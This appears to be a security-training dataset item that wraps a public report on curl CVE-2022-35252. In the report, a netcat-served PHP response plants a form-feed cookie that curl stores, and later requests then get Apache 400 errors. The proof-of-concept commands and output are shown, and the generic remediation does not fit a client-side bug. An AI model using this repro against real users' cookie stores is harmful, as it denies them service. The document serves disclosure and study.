# INPUT_VALIDATION — h1

- source: h1
- class: input_validation
- cwe: CWE-20
- cve: ['CVE-2022-35252']
- severity: low
- program: curl
- quality_score: 13

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** CVE-2022-35252: control code in cookie denial of service
**Affected Asset:** https://github.com/curl/curl

**Vulnerability Description:**
## Summary:
I took a look at https://github.com/curl/curl/pull/9048/commits/d7bcbc7d8d4b6d972d3da12d54819169a19c287b (a sneak peek on a vulnerability to be announced tomorrow). My guess for that vulnerability is that since cookies are persistent, someone who can trick curl into storing cookies can store large amounts of cookies into curl cookie store, which will prevent curl from ever interacting with the server (due to large request being generated causing a 400 error)

I found a separate way to do this, curl does not implement character check on cookie name or value when saving to cookie store. So for example a form feed '\f' can be saved in curl's cookie store. When form feed is sent by curl to a server such as Apache, Apache will respond with 400 Error (historically, Apache would accept, however now due to HTTP smuggling concerns, Apache will now strictly reject any such control characters.), preventing someone from ever interacting the server with the cookie store.

According to the spec, cookies should not contain control characters anyway, see https://datatracker.ietf.org/doc/html/rfc6265#section-4.1.1.

## Steps To Reproduce:

1. 

In test.php,
`````
<?php
echo("HTTP/1.1 200 OK\r\nDate: Fri, 29 Apr 2022 10:11:55 GMT\r\nServer: Apache/2.4.43 (Debian)\r\nSet-Cookie: [REDACTED_COOKIE]; \r\nContent-Length: 0\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n");
`````
Setup malicious server,
`````
php test.php | nc -nvlp 3333
`````

2. Cookie with form feed is saved, see 0c byte before the 0a terminator
`````
curl -c cookies.txt http://127.0.0.1:3333
`````
`````
➜  ~ xxd cookies.txt
00000000: 2320 4e[REDACTED_PHONE]  # Netscape HTTP 
00000010: 436f 6f6b [REDACTED_PHONE]c 650a 2320 6874  Cookie File.# ht
00000020: 7470 733a 2f2f 6375 726c 2e73 652f 646f  tps://curl.se/do
00000030: 6373 2f[REDACTED_PHONE]d 636f 6f6b 6965 732e  cs/http-cookies.
00000040: 6874 6d6c 0a[REDACTED_PHONE]c65  html.# This file
00000050: [REDACTED_PHONE]e [REDACTED_PHONE]   was generated b
00000060: 7920 6c[REDACTED_PHONE]c[REDACTED_PHONE]  y libcurl! Edit 
00000070: [REDACTED_PHONE]f75 7220 6f77 6e[REDACTED_PHONE]b  at your own risk
00000080: 2e0a 0a31 3237 2e30 2e30 2e[REDACTED_PHONE]c  ...127.0.0.1.FAL
00000090: 5345 092f 0946 414c [REDACTED_PHONE]  SE./.FALSE.0.a.b
000000a0: 0c0a                                     ..
`````
3. Apache will now respond with "400 bad request" on further request to the server using the poisoned cookie store. This because Apache rejects control characters other than \r or \n in the request head.
`````
* Trying 127.0.0.1:80...
* Connected to [REDACTED_PHONE]) port 80 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1
> User-Agent: curl/7.83.1
> Accept: */*
> Cookie: [REDACTED_COOKIE]

> 
*

## Analysis / Response

**Vulnerability Class:** input_validation
**CWE:** CWE-20
**Weakness:** Improper Input Validation
**Severity:** low
**Endpoint Pattern:** https://github.com/curl/curl/pull/9048/commits/d7bcbc7d8d4b6d972d3da12d54819169a19c287b

**Impact Assessment:**
An attacker can possibly MiTM the connection and poison the cookie store using cookies with control characters, preventing a user / application from ever interacting with the particular HTTP server with the same cookie store.

Possibly same impact as the "cookie limit" vulnerability to be announced tomorrow.

**Remediation:**
Implement strict server-side input validation with allowlists. Validate data type, length, range, and format. Reject unexpected input rather than sanitizing.
